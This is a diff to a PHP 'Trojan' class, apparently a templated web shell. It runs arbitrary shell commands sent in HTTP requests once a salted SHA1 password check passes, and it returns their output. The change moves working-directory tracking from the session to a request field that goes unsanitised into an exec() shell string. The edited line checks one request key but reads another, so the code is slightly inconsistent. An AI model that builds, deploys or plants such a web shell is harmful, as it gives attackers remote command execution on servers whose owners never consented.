@@ -4,6 +4,7 @@ class Trojan{
     private $cwd      = '';
     private $response = array(
         /*
+        'cwd'            => null,
         'error'          => null,
         'output'         => null,
         'prompt_context' => null,
@@ -13,9 +14,9 @@ class Trojan{
     /**
      * A generic constructor
      */
-    public function __construct(){
+    public function __construct($request){
         # emulate cwd persistence
-        $this->cwd = (isset($_SESSION['cwd'])) ? $_SESSION['cwd'] : trim(`pwd`);
+        $this->cwd = ($request['args']['cwd']) ? $request['cwd'] : trim(`pwd`);
     }
 
     /**
@@ -55,7 +56,7 @@ class Trojan{
         exec("cd {$this->cwd}; $command 2>&1; pwd", $output_raw);
 
         # buffer the results
-        $_SESSION['cwd']          = $this->cwd = array_pop($output_raw);
+        $this->response['cwd']    = $this->cwd = array_pop($output_raw);
         $this->response['output'] = join($output_raw, "\n");
 
         # send the response
@@ -93,8 +94,7 @@ class Trojan{
 
 # only process the command if a valid password has been specified
 if(sha1($_REQUEST['args']['password'] . '<%= params[:salt] %>') == '<%= params[:hash] %>'){ 
-    session_start();
-    $trojan = new Trojan();
+    $trojan = new Trojan($_REQUEST);
     $trojan->process_command($_REQUEST);
 }
 
